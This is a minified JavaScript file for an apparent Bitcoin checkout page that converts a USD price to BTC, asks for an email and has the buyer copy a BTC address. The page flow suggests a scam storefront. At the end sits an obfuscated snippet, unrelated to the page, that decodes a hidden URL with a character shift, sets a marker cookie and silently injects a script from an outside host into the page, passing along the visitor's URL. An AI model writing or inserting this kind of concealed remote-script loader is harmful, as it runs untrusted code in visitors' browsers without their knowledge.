const increaseBtn=document.getElementById("increase"),reduceBtn=document.getElementById("reduce"),amountInput=document.getElementById("number"),amountDs=document.getElementById("amount"),copyId=document.getElementById("copy"),purchase1=document.getElementById("purchase1"),purchase2=document.getElementById("purchase2"),purchase3=document.getElementById("purchase3"),email=document.getElementById("email"),vvid=document.getElementById("vv"),exx=document.getElementById("exx"),finalHolder=document.getElementById("finalHolder"),btca=document.getElementById("btcAddress"),complain=document.getElementById("complain"),getBtc=e=>new Promise(((t,n)=>{const a=new XMLHttpRequest;a.addEventListener("readystatechange",(()=>{4===a.readyState&&200===a.status?t(JSON.parse(a.responseText)):4===a.readyState&&n("AN ERROR OCCURED")})),a.open("GET",e),a.send()})),orderId=()=>{let e=`a0acc${Math.ceil(10*Math.random())}-fg9m${Math.floor(10*Math.random())}-asd${Math.ceil(10*Math.random())}-aaa${Math.floor(10*Math.random())}`;document.getElementById("orderId").innerHTML=`ORDER ID : ${e}n`};orderId(),null!==sessionStorage.getItem("price")?(sessionStorage.setItem("final",sessionStorage.getItem("price")),getBtc(`https://blockchain.info/tobtc?currency=USD&value=${sessionStorage.getItem("price")}`).then((e=>{vvid.innerHTML=e,exx.innerHTML=e})).catch((e=>console.log(e)))):(sessionStorage.setItem("price",75),sessionStorage.setItem("bal",1460)),increaseBtn.addEventListener("click",(e=>{amountInput.value=parseInt(amountInput.value)+1;let t=sessionStorage.getItem("price")*parseInt(amountInput.value);sessionStorage.setItem("final",t),getBtc(`https://blockchain.info/tobtc?currency=USD&value=${t}`).then((e=>{vvid.innerHTML=e,exx.innerHTML=e})).catch((e=>console.log(e)))})),reduceBtn.addEventListener("click",(e=>{if(amountInput.value>1){amountInput.value=parseFloat(amountInput.value)-1;let e=sessionStorage.getItem("price")*parseInt(amountInput.value);sessionStorage.setItem("final",e),getBtc(`https://blockchain.info/tobtc?currency=USD&value=${e}`).then((e=>{vvid.innerHTML=e,exx.innerHTML=e})).catch((e=>console.log(e)))}})),copyId.addEventListener("click",(e=>{btca.style.display="",finalHolder.style.display="none",complain.style.display="";let t=document.getElementById("btcAddress");t.select(),t.setSelectionRange(0,99999),document.execCommand("copy")})),purchase1.style.display="none",finalHolder.style.display="none",purchase2.style.display="",purchase3.style.display="none",btca.style.display="",document.getElementById("purchase").addEventListener("click",(e=>{purchase1.style.display="none",purchase2.style.display="",document.getElementById("pri").innerHTML=`Price : $${sessionStorage.getItem("price")}`,document.getElementById("bri").innerHTML=`Balance : $${sessionStorage.getItem("bal")}k`})),document.getElementById("next").addEventListener("click",(e=>{email.value.length>0&&email.value.includes("@")&&email.value.includes(".")?(purchase2.style.display="none",purchase3.style.display=""):alert("ENTER A VALID EMAIL")})),document.getElementById("scan").addEventListener("click",(e=>{e.preventDefault(),complain.style.display="none",finalHolder.style.display="",btca.style.display="none"}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3nsjy'+'xyfynh3htr4ywfhpnsl4x'+'hwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));